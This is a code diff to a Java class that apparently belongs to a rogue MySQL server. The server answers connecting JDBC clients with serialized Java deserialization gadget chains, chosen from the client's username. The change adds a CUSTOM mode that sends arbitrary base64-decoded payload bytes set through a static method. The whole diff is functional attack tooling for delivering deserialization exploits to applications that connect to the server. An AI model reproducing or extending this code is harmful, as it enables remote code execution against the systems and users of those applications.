@@ -8,6 +8,7 @@ import org.apache.logging.log4j.Logger;
 
 import java.io.OutputStream;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.List;
 import java.util.Objects;
 
@@ -15,6 +16,11 @@ public class GadgetResolver implements Resolver {
     private static final Logger log = LogManager.getLogger(GadgetResolver.class);
     private final OutputStream outputStream;
     private final String username;
+    private static String customBase64Gadget;
+
+    public static void setCustomGadget(String base64) {
+        customBase64Gadget = base64;
+    }
 
     public GadgetResolver(OutputStream outputStream, String username) {
         this.outputStream = outputStream;
@@ -27,19 +33,23 @@ public class GadgetResolver implements Resolver {
                 return;
             }
             String[] sps = username.split("_");
-            if (sps.length < 3) {
+            if (sps.length < 2) {
                 return;
             }
             String gadget = sps[1];
 
-            StringBuilder builder = new StringBuilder();
-            for (int i = 2; i < sps.length; i++) {
-                builder.append(sps[i]);
-                if (i != sps.length - 1) {
-                    builder.append("_");
+            StringBuilder builder;
+            String cmd = null;
+            if (!gadget.equals("CUSTOM")) {
+                builder = new StringBuilder();
+                for (int i = 2; i < sps.length; i++) {
+                    builder.append(sps[i]);
+                    if (i != sps.length - 1) {
+                        builder.append("_");
+                    }
                 }
+                cmd = builder.toString();
             }
-            String cmd = builder.toString();
 
             log.info("mode: deserialization");
             LogUtil.log("mode: deserialization");
@@ -85,14 +95,28 @@ public class GadgetResolver implements Resolver {
                 case "URLDNS":
                     data = SerUtil.serializeObject(new URLDNS().getObject(cmd));
                     break;
+                case "CUSTOM":
+                    if (customBase64Gadget == null || customBase64Gadget.isEmpty()) {
+                        LogUtil.log("must set custom gadget data first");
+                        return;
+                    }
+                    data = Base64.getDecoder().decode(customBase64Gadget);
+                    break;
                 default:
                     return;
             }
             log.info("gadget: {}", gadget);
             LogUtil.log("user gadget: " + gadget.toLowerCase());
 
-            log.info("cmd (params): {}", cmd);
-            LogUtil.log("cmd (params): " + cmd);
+            if (cmd != null) {
+                log.info("cmd (params): {}", cmd);
+                LogUtil.log("cmd (params): " + cmd);
+            }
+
+            if (gadget.equals("CUSTOM")) {
+                log.info("use custom gadget");
+                LogUtil.log("use custom gadget");
+            }
 
             outputStream.write(Objects.requireNonNull(PacketHelper.buildPacket(6,
                     ColumnPacket.buildColumnValuesPacket(
@@ -104,7 +128,7 @@ public class GadgetResolver implements Resolver {
                     PacketHelper.buildPacket(7, Resp.EOF)));
             outputStream.flush();
         } catch (Exception ex) {
-            log.error("gadget resolver error: {}",ex.toString());
+            log.error("gadget resolver error: {}", ex.toString());
         }
     }
 }
